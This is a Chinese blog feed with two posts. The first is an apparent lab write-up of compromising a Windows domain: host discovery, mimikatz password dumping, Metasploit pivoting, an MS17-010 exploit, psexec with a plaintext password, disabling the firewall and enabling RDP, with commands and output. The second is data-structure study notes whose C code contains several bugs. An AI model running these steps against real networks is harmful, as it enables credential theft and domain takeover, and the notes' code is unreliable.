class="line">......</span><br></pre></td></tr></table></figure><p>域内主机存活探测</p><ol><li><p>ICMP协议</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">也就是ping命令</span><br><span class="line">进入shell执行</span><br><span class="line">for /L %I in (1,1,254) DO @ping -w 1 -n 1 192.168.52.%I | findstr &quot;TTL&quot;</span><br><span class="line">探测存活主机</span><br></pre></td></tr></table></figure><p><img src="https://alanlitl.oss-cn-chengdu.aliyuncs.com/picgo/20201217204027.png" alt="QQ截图20201217204020"></p></li><li><p>msf的<code>udp_probe</code></p><blockquote><p>需要添加socks代理, 在后面</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/scanner/discovery/udp_probe</span><br><span class="line">set rhosts 192.168.52.0/24</span><br><span class="line">set threads 5</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p><img src="https://alanlitl.oss-cn-chengdu.aliyuncs.com/picgo/20201217203624.png" alt="QQ截图20201217203619"></p></li></ol><p>发现DNS server一般为域控</p><img src="https://alanlitl.oss-cn-chengdu.aliyuncs.com/picgo/20201213215145.png" alt="QQ截图20201213215114" style="zoom:150%;" /><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p><img src="https://alanlitl.oss-cn-chengdu.aliyuncs.com/picgo/20201214195912.png" alt="QQ截图20201213220021"></p><p>这里提权十分简单, 实际情况可能更复杂</p><h2 id="获取密码"><a href="#获取密码" class="headerlink" title="获取密码"></a>获取密码</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">自带模块</span><br><span class="line">post/windows/gather/smart_hashdump</span><br><span class="line">使用mimikatz</span><br><span class="line">load mimikatz 加载模块</span><br><span class="line">mimikatz_command -f sekurlsa::searchPasswords 获取明文密码</span><br><span class="line">使用kiwi</span><br><span class="line">load kiwi</span><br><span class="line">creds_all  获取密码</span><br><span class="line">kiwi_cmd mimikatz命令  可以使用mimikatz所有命令</span><br><span class="line">kiwi_cmd sekurlsa::logonpasswords</span><br><span class="line"></span><br><span class="line">上传mimikatz获取明文</span><br><span class="line">https://github.com/gentilkiwi/mimikatz/releases</span><br><span class="line">上传文件</span><br><span class="line">meterpreter &gt; upload /home/alanlitl//mimikatz_trunk/x64/mimikatz.exe C:\\phpStudy\\WWW\\yxcms</span><br><span class="line">进入windows的shell运行mimikatz</span><br><span class="line">提升权限</span><br><span class="line">privilege::debug</span><br><span class="line">获取密码</span><br><span class="line">sekurlsa::logonPasswords</span><br></pre></td></tr></table></figure><h1 id="横向移动"><a href="#横向移动" class="headerlink" title="横向移动"></a>横向移动</h1><h2 id="添加路由"><a href="#添加路由" class="headerlink" title="添加路由"></a>添加路由</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run autoroute -s 192.168.52.0/24 内网网段</span><br><span class="line">meterpreter &gt; run autoroute -p 查看添加的路由</span><br></pre></td></tr></table></figure><p><img src="https://alanlitl.oss-cn-chengdu.aliyuncs.com/picgo/20201215021734.png" alt="QQ截图20201215021729"></p><h2 id="添加socks4代理"><a href="#添加socks4代理" class="headerlink" title="添加socks4代理"></a>添加socks4代理</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">将上面的进程移到后台(千万不能结束或者新建msf窗口)</span><br><span class="line">background 或者 session 2(未使用的session数字) 添加到后台</span><br><span class="line"></span><br><span class="line">use auxiliary/server/socks4a</span><br><span class="line">set srvhost kali的ip</span><br><span class="line">set srvport 1080(如果创建失败可能是端口占用, 使用其他端口即可)</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p><img src="https://alanlitl.oss-cn-chengdu.aliyuncs.com/picgo/20201215022410.png" alt="QQ截图20201215022358"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">修改/etc/proxychains.conf文件</span><br><span class="line">改为自己socks的ip port即可</span><br></pre></td></tr></table></figure><p><img src="https://alanlitl.oss-cn-chengdu.aliyuncs.com/picgo/20201215022450.png" alt="QQ截图20201215022445"></p><p><img src="https://alanlitl.oss-cn-chengdu.aliyuncs.com/picgo/20201215145143.png" alt="QQ截图20201215145101"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">前面已经找到了内网的其他主机</span><br><span class="line">192.168.52.141和192.168.52.138</span><br></pre></td></tr></table></figure><h1 id="Win-2K3"><a href="#Win-2K3" class="headerlink" title="Win 2K3"></a>Win 2K3</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/smb/ms17_010_psexec</span><br><span class="line">set payload windows/meterpreter/bind_tcp</span><br><span class="line">set rhost 192.168.52.141</span><br><span class="line"></span><br><span class="line">成功拿下</span><br><span class="line">但是执行mimikatz时却失败了</span><br><span class="line"></span><br><span class="line">但我们在前面已经拿到了密码</span><br><span class="line">2313root!  我更改过</span><br></pre></td></tr></table></figure><p><img src="https://alanlitl.oss-cn-chengdu.aliyuncs.com/picgo/20201215181758.png" alt="QQ截图20201215181738"></p><h1 id="拿下域控"><a href="#拿下域控" class="headerlink" title="拿下域控"></a>拿下域控</h1><blockquote><p>开始在kali上使用<code>exploit/windows/smb/psexec</code>模块一直失败, 以为是模块问题, 结果是域控防火墙开着, 只能在win7上使用PsExec.exe进行登录</p></blockquote><h2 id="psexec"><a href="#psexec" class="headerlink" title="psexec"></a>psexec</h2><blockquote><p>下载地址:<a href="https://docs.microsoft.com/zh-cn/sysinternals/downloads/psexec">https://docs.microsoft.com/zh-cn/sysinternals/downloads/psexec</a></p></blockquote><p>上传</p><p><img src="https://alanlitl.oss-cn-chengdu.aliyuncs.com/picgo/20201221002413.png" alt="QQ截图20201220215210"></p><p>在已经拿下的win7上执行(远程桌面)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PsExec.exe \\192.168.52.138 -u liukaifeng01 -s cmd.exe  输入密码后进入交互shell</span><br><span class="line">一定要加-s以system权限执行</span><br></pre></td></tr></table></figure><p><img src="https://alanlitl.oss-cn-chengdu.aliyuncs.com/picgo/20201221001730.png" alt="QQ截图20201220231352"></p><blockquote><p>这时已经相当于拿下域控了, 我们现在开启远程桌面</p></blockquote><h3 id="关闭域控防火墙"><a href="#关闭域控防火墙" class="headerlink" title="关闭域控防火墙"></a>关闭域控防火墙</h3><p>查看防火墙状态(win8 开始就有了不同的防火墙命令)</p><p><img src="https://alanlitl.oss-cn-chengdu.aliyuncs.com/picgo/20201221001711.png" alt="QQ截图20201220215515"></p><p>关闭防火墙</p><p><img src="https://alanlitl.oss-cn-chengdu.aliyuncs.com/picgo/20201221002125.png" alt="QQ截图20201220231352"></p><p>现在就可以使用msf远程登录了</p><p>要在开启proxychains代理的情况下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/smb/psexec</span><br><span class="line">set payload windows/x64/meterpreter/bind_tcp  (这里要使用主动连接, 域控在内网里面.我们无法访问)</span><br><span class="line">set rhosts 192.168.52.138</span><br><span class="line">set smbpass 2313root!</span><br><span class="line">set smbuser liukaifeng01</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p><img src="https://alanlitl.oss-cn-chengdu.aliyuncs.com/picgo/20201221003137.png" alt="QQ截图20201220231430"></p><h3 id="远程连接域控"><a href="#远程连接域控" class="headerlink" title="远程连接域控"></a>远程连接域控</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">设置远程桌面端口</span><br><span class="line">reg add &quot;HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&quot; /t REG_DWORD /v portnumber /d 3389 /f</span><br><span class="line">开启远程桌面</span><br><span class="line">wmic RDTOGGLE WHERE ServerName=&#x27;%COMPUTERNAME%&#x27; call SetAllowTSConnections 1</span><br></pre></td></tr></table></figure><p>在windows下配置代理</p><p>使用proxifier(网上有许多教程)</p><p><img src="https://alanlitl.oss-cn-chengdu.aliyuncs.com/picgo/20201221005804.png" alt="屏幕截图 2020-12-21 000138"></p><p><img src="https://alanlitl.oss-cn-chengdu.aliyuncs.com/picgo/20201221005810.png" alt="QQ截图20201221000109"></p><p>其中address是你的kali的ip, kali要先搭建好proxychains</p><p>代理好后,在浏览器访问<code>192.168.52.99或者192.168.52.138</code></p><p>如果能访问则代理成功</p><blockquote><p>这里还遇到一个小坑, 输入账号的时候不能使用直接使用<code>liukaifeng01</code>,要使用GOD\liukaifeng01, 否则就会提示密码错误</p></blockquote><p>错误的账户</p><p><img src="https://alanlitl.oss-cn-chengdu.aliyuncs.com/picgo/20201221010133.png" alt="QQ截图20201220235829"></p><p>使用正确的账户登录</p><p><img src="https://alanlitl.oss-cn-chengdu.aliyuncs.com/picgo/20201221010140.png" alt="QQ截图20201220235852"></p><p>远程连接成功</p><p><img src="https://alanlitl.oss-cn-chengdu.aliyuncs.com/picgo/20201221010055.png" alt="QQ截图20201220235906"></p><h3 id="使用-ms17-010"><a href="#使用-ms17-010" class="headerlink" title="使用 ms17-010"></a>使用 ms17-010</h3><p>在关闭防火墙的情况下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">proxychains msfconsole   使用代理启动msf</span><br><span class="line">use exploit/windows/smb/ms17_010_psexec</span><br><span class="line">set payload windows/meterpreter/bind_tcp  不出网使用正向连接</span><br><span class="line">set rhost 192.168.2.138 域ip</span><br><span class="line">run</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf5 exploit(windows/smb/ms17_010_psexec) &gt; run</span><br><span class="line">|S-chain|-&lt;&gt;-192.168.3.130:1080-&lt;&gt;&lt;&gt;-192.168.2.138:445-&lt;&gt;&lt;&gt;-OK</span><br><span class="line"></span><br><span class="line">[*] 192.168.2.138:445 - Target OS: Windows Server 2008 R2 Datacenter 7601 Service Pack 1</span><br><span class="line">[*] 192.168.2.138:445 - Built a write-what-where primitive...</span><br><span class="line">[+] 192.168.2.138:445 - Overwrite complete... SYSTEM session obtained!</span><br><span class="line">[*] 192.168.2.138:445 - Selecting PowerShell target</span><br><span class="line">[*] 192.168.2.138:445 - Executing the payload...</span><br><span class="line">[+] 192.168.2.138:445 - Service start timed out, OK if running a command or non-service executable...</span><br><span class="line">[*] Started bind TCP handler against 192.168.2.138:4444</span><br><span class="line">|S-chain|-&lt;&gt;-192.168.3.130:1080-&lt;&gt;&lt;&gt;-192.168.2.138:4444-&lt;&gt;&lt;&gt;-OK</span><br><span class="line">[*] Sending stage (176195 bytes) to 192.168.2.138</span><br><span class="line">[*] Meterpreter session 1 opened (0.0.0.0:0 -&gt; 192.168.3.130:1080) at 2021-01-21 18:07:19 +0800</span><br><span class="line"></span><br><span class="line">meterpreter &gt; getuid</span><br><span class="line">Server username: NT AUTHORITY\SYSTEM</span><br><span class="line"></span><br><span class="line">成功获取拿下域</span><br></pre></td></tr></table></figure><p>参考:<a href="https://www.cnblogs.com/g0udan/p/12411937.html">https://www.cnblogs.com/g0udan/p/12411937.html</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>数据结构</title>
    <link href="/2020/12/21/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"/>
    <url>/2020/12/21/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/</url>
    
    <content type="html"><![CDATA[<h1 id="数据结构术语"><a href="#数据结构术语" class="headerlink" title="数据结构术语"></a>数据结构术语</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">结构是指数据间的关系</span><br><span class="line"></span><br><span class="line">数据结构是指 相互之间存在某种特定关系的数据元素的集合</span><br><span class="line"></span><br><span class="line">数据结构包括三方面</span><br><span class="line">数据的逻辑结构</span><br><span class="line">数据的存储结构</span><br><span class="line">数据的运算</span><br><span class="line">一个算法的设计取决于选定的逻辑结构，算法的实现依赖于采用的存储结构</span><br><span class="line"></span><br><span class="line">线性 一对一</span><br><span class="line">树状 一对多</span><br><span class="line">网状 多对多</span><br><span class="line"></span><br><span class="line">数据结构是一个二元组 (D,R), D是数据元素的有限集, R是D上关系的有限集</span><br><span class="line"></span><br><span class="line">数据结构的5个重要特性 (算法的特征)</span><br><span class="line">有穷性</span><br><span class="line">确定性</span><br><span class="line">可行性</span><br><span class="line">输入, 输出</span><br><span class="line"></span><br><span class="line">算法要求</span><br><span class="line">可读性 健壮性 效率与储存需求</span><br><span class="line"></span><br><span class="line">时间复杂度排序</span><br><span class="line">O(1) &lt; O(log₂n) &lt; O(n) &lt; O(n*log₂n ) &lt; O(n2)&lt; O(n3)…&lt;O(2n)&lt;O(3n)&lt;…&lt;O(n!)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="顺序线性表"><a href="#顺序线性表" class="headerlink" title="顺序线性表"></a>顺序线性表</h1><h2 id="0-线性表类型定义"><a href="#0-线性表类型定义" class="headerlink" title="0.线性表类型定义"></a>0.线性表类型定义</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">同一性</span><br><span class="line">有穷性</span><br><span class="line">有序性</span><br></pre></td></tr></table></figure><h2 id="1-顺序表定义"><a href="#1-顺序表定义" class="headerlink" title="1. 顺序表定义"></a>1. 顺序表定义</h2><ul><li>定义</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">typedef struct</span><br><span class="line">&#123;</span><br><span class="line">char data[max]; //数据(数组)</span><br><span class="line">int length;   //长度</span><br><span class="line">&#125;sqlist,L  //结构体名</span><br></pre></td></tr></table></figure><ul><li>读取数据(点操作)</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">读取表里面的数据</span><br><span class="line"><span class="keyword">int</span> A;</span><br><span class="line">A = sqlist.data[i];</span><br><span class="line"></span><br><span class="line">读取表长</span><br><span class="line"><span class="keyword">int</span> lenght;</span><br><span class="line">length = sqlist.length;</span><br></pre></td></tr></table></figure><h2 id="2-顺序表相关操作"><a href="#2-顺序表相关操作" class="headerlink" title="2. 顺序表相关操作"></a>2. 顺序表相关操作</h2><ul><li><p>初始化</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">initList</span><span class="params">(SqList &amp;L)</span></span>&#123;</span><br><span class="line">L.length = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>插入数据</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//L为结构体, i为插入位置, e为插入元素</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sqLiistInsert</span><span class="params">(sqlist &amp;L, <span class="keyword">int</span> i, <span class="keyword">char</span> e)</span></span>&#123;</span><br><span class="line">    <span class="comment">//处理特殊情况</span></span><br><span class="line">    <span class="keyword">if</span>(i&lt;<span class="number">1</span>||i&gt;L.length)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//判断是否满</span></span><br><span class="line">    <span class="keyword">if</span>(L.length&gt;=L.size)&#123;</span><br><span class="line">        ......</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//具体插入操作</span></span><br><span class="line">    <span class="keyword">char</span> *p, *q;</span><br><span class="line">    q = &amp;(L.elem[i<span class="number">-1</span>]); <span class="comment">//将q赋值为第i个元素的位置(因为是获取的地址,不是值), 从第i个元素开始就要向后移动一位</span></span><br><span class="line">    <span class="comment">//for循环中, p为最后一个元素的位置, 依次将最后一个元素, 倒数第二个元素...向后移动一位, 直到插入元素i的位置</span></span><br><span class="line">    <span class="keyword">for</span>(p = &amp;(L.data[L.length<span class="number">-1</span>]), p&gt;=q; p--)&#123;</span><br><span class="line">        *(p+<span class="number">1</span>) = *p; <span class="comment">//元素依次向后移动一位</span></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//将新元素赋值到i的位置</span></span><br><span class="line">    *q = e;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//长度加一</span></span><br><span class="line">    L.length++;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//其他移动方法</span></span><br><span class="line"><span class="keyword">for</span>(i = L.length - <span class="number">1</span>, i &gt;= p, i--)&#123;</span><br><span class="line">    L.data[i+<span class="number">1</span>] = L.data[i];</span><br><span class="line">&#125;</span><br><span class="line">L.data[p] = e;</span><br></pre></td></tr></table></figure><p>​    插入时间复杂度</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">平均 n/2, 最坏 n</span><br></pre></td></tr></table></figure></li><li><p>删除数据</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//i为删除元素的位置, y为返回删除元素</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">delete</span><span class="params">(Sqlist &amp;L, <span class="keyword">int</span> x, <span class="keyword">int</span> *y)</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span> j;</span><br><span class="line">    <span class="comment">//删除位置错误</span></span><br><span class="line">    <span class="keyword">if</span>(x&lt;<span class="number">1</span> || x&gt;Llength)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        *y = L.data[i<span class="number">-1</span>];</span><br><span class="line">        <span class="comment">//j为要删除的位置, 将后面的元素依次向前移动一位</span></span><br><span class="line">        <span class="keyword">for</span>(j=x; j&lt;=Length<span class="number">-1</span>; j++)&#123;</span><br><span class="line">            L.data[j<span class="number">-1</span>] = L.data[j];</span><br><span class="line">        &#125;</span><br><span class="line">        L.length--;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>  删除时间复杂度</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(n-1)/2</span><br></pre></td></tr></table></figure></li></ul><ul><li><p>按值查找</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">finddata</span><span class="params">(Sqlist &amp;L, <span class="keyword">int</span> e)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">for</span>(i =<span class="number">0</span>; i &lt; L.length; i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(e == L.data[i])</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>无序表合并</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">mergelist</span><span class="params">(<span class="built_in">list</span> la, <span class="built_in">list</span> lb, <span class="built_in">list</span> &amp;lc)</span></span>&#123;</span><br><span class="line">    initlist(lc)<span class="comment">//初始化</span></span><br><span class="line">    <span class="keyword">int</span> i = <span class="number">1</span>, j = <span class="number">1</span>, k = <span class="number">0</span>;</span><br><span class="line">    la_len = listlength(la);</span><br><span class="line">    lb_len = listlength(lb);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">1</span>; i &lt; lb_len; i++)&#123;</span><br><span class="line">        e = listget(lb,i) <span class="comment">//获取lb中的元素</span></span><br><span class="line">        <span class="keyword">if</span>(!listlocal(la, e))&#123; <span class="comment">//在la中无此元素</span></span><br><span class="line">            listinsert(la,++la_len, e)<span class="comment">//插入元素</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>缺点</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1. 插入和删除操作时需要移动大量元素。</span><br><span class="line">2. 要给长度变化较大的线性表预先分配空间，利用率不好。</span><br><span class="line">3. 表的容量难以扩充</span><br></pre></td></tr></table></figure></li></ul><h1 id="链表"><a href="#链表" class="headerlink" title="链表"></a>链表</h1><blockquote><p>特点: 用一组任意的存储单元存储线性表的数据元素（可连续可不连续）</p></blockquote><h2 id="单链表"><a href="#单链表" class="headerlink" title="单链表"></a>单链表</h2><h3 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">typedef struct Lnode</span><br><span class="line">&#123;</span><br><span class="line">int data;</span><br><span class="line">Struct Lnode *next;</span><br><span class="line">&#125;Lnode,*linklist;</span><br></pre></td></tr></table></figure><p>取用data</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Lnode S;</span><br><span class="line">int b;</span><br><span class="line">b = S -&gt; data;</span><br></pre></td></tr></table></figure><h3 id="取第i个元素"><a href="#取第i个元素" class="headerlink" title="取第i个元素"></a>取第<code>i</code>个元素</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">Linklist <span class="title">ListGet</span><span class="params">(linklist L,<span class="keyword">int</span> i)</span>  <span class="comment">//取第i个元素</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    p=L-&gt;next;</span><br><span class="line">    j=<span class="number">1</span>;</span><br><span class="line">    While(p&amp;&amp;j&lt;i)&#123;</span><br><span class="line">        p=p-&gt;next;++j;    <span class="comment">//指针后移</span></span><br><span class="line">    &#125;    </span><br><span class="line">    If(!p||j&gt;i)</span><br><span class="line">        <span class="keyword">return</span> error;</span><br><span class="line">   e=p-&gt;data;</span><br><span class="line">    Return OK;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="插入"><a href="#插入" class="headerlink" title="插入"></a>插入</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">Linklist <span class="title">listinsert_L</span><span class="params">(linklist L,<span class="keyword">int</span> i, elemtype e)</span></span>&#123;</span><br><span class="line">p = L;                <span class="comment">//p指针指向头结点，（方便从头查找第i位）</span></span><br><span class="line">    j = <span class="number">0</span>;  </span><br><span class="line">    While(p&amp;&amp;j&lt;i<span class="number">-1</span>)&#123;</span><br><span class="line">        p = p-&gt;next;</span><br><span class="line">        ++j;</span><br><span class="line">    &#125;      <span class="comment">//查找第i-1个结点</span></span><br><span class="line">    <span class="keyword">if</span> (!p||j&gt;i<span class="number">-1</span>) </span><br><span class="line">        <span class="keyword">return</span> error;        <span class="comment">//若i不合法</span></span><br><span class="line">    s = (linklist)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(Lnode)); </span><br><span class="line">    s-&gt;data = e;    <span class="comment">//生成新结点</span></span><br><span class="line">    s-&gt;next = p-&gt;next;  <span class="comment">//讲p的next赋值给s的next</span></span><br><span class="line">    p-&gt;next = s;          <span class="comment">//p的next变为s</span></span><br><span class="line">    Return ok;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="删除"><a href="#删除" class="headerlink" title="删除"></a>删除</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">与插入不同的部分</span><br><span class="line">q = p-&gt;next;       <span class="comment">//q为要删除的节点</span></span><br><span class="line">p-&gt;next = q-&gt;next;       <span class="comment">//将q的next赋值给p的next</span></span><br><span class="line">e = q-&gt;data;</span><br><span class="line"><span class="built_in">free</span>(q);  </span><br></pre></td></tr></table></figure><p>插入删除时间复杂度</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O(n)</span><br></pre></td></tr></table></figure><h3 id="尾插法"><a href="#尾插法" class="headerlink" 